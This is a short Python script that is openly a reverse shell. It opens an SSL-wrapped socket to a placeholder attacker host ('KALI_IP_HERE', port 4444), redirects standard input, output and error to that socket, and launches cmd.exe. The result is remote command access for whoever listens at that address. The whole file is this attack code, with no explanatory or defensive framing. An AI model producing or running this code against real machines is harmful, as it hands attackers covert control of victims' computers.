import socket
import ssl
import subprocess
import os

def reverse_shell():
    attacker_ip = 'KALI_IP_HERE'
    attacker_port = 4444

    # Create an SSL-enabled socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_sock = ssl.wrap_socket(s)

    try:
        ssl_sock.connect((attacker_ip, attacker_port))

        os.dup2(ssl_sock.fileno(), 0)  # stdin
        os.dup2(ssl_sock.fileno(), 1)  # stdout
        os.dup2(ssl_sock.fileno(), 2)  # stderr

        subprocess.call(['cmd.exe'])

    except socket.error as err:
        print(f"Connection error: {err}")
        ssl_sock.close()

if __name__ == "__main__":
    reverse_shell()